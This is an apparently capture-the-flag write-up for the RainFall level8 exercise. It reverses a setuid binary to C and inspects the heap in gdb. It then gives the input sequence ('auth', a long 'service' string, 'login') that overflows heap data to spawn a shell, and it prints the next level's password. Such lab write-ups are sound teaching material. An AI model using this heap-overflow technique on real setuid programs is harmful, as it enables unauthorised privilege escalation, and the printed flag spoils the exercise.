
```bash
level8@RainFall:~$ ls -la
-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8

level8@RainFall:~$ file level8
level8: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3067a180acabc94d328ab89f0a5a914688bf67ab, not stripped
```

Reversed in c:
```c
char **auth;
char *service;

int main(int argc, const char **argv, const char **envp)
{
  char s[136];

  while (1)
  {
    printf("%p, %p \n", auth, service);

    if (fgets(s, 128, stdin) == 0)
    {
      break;
    }

    if (memcmp(s, "auth ", 5u) == 0)
    {
      auth = malloc(4u);
      *auth = NULL;
      if (strlen(&s[5]) <= 30u)
      {
        strcpy((char *)auth, &s[5]);
      }
    }

    if (memcmp(s, "reset", 5u) == 0)
    {
      free(auth);
    }

    if (memcmp(s, "service", 6u) == 0)
    {
      service = strdup(&s[7]);
    }

    if (memcmp(s, "login", 5u) == 0)
    {
      if (auth[8] != '\0')
      {
        system("/bin/sh");
      }
      else
      {
        fwrite("Password:\n", 1u, 10u, stdout);
      }
    }
  }
  return 0;
}
```

With auth AAAAAAAAAAAAAAAAAAA, it just did malloc without values:
(gdb) break *main+145 
Breakpoint 1 at 0x80485f5
(gdb) break *main+200
Breakpoint 2 at 0x804862c
(gdb) break *main+235
Breakpoint 3 at 0x804864f
(gdb) break *main+280
Breakpoint 4 at 0x804867c
(gdb) break *main+325
Breakpoint 5 at 0x80486a9
(gdb) watch auth
Hardware watchpoint 6: auth
(gdb) watch service
Hardware watchpoint 7: service
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level8/level8 
(nil), (nil) 
auth AAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080485f5 in main ()
(gdb) info proc mappings
process 3204
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level8/level8
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level8/level8
	 0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fd9000 0xb7fdd000     0x4000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) x/54bx 0x804a000
0x804a000:	0x00	0x00	0x00	0x00	0x11	0x00	0x00	0x00
0x804a008:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a010:	0x00	0x00	0x00	0x00	0xf1	0x0f	0x02	0x00
0x804a018:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a020:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00


It is really easy, we call `auth AAAA` to set the auth pointer and call `service ...` with enough value so `auth[8]` is not equal to zero, then we can call `login` to pawn a terminal of next level.

```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth AAAA
0x804a008, (nil) 
serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```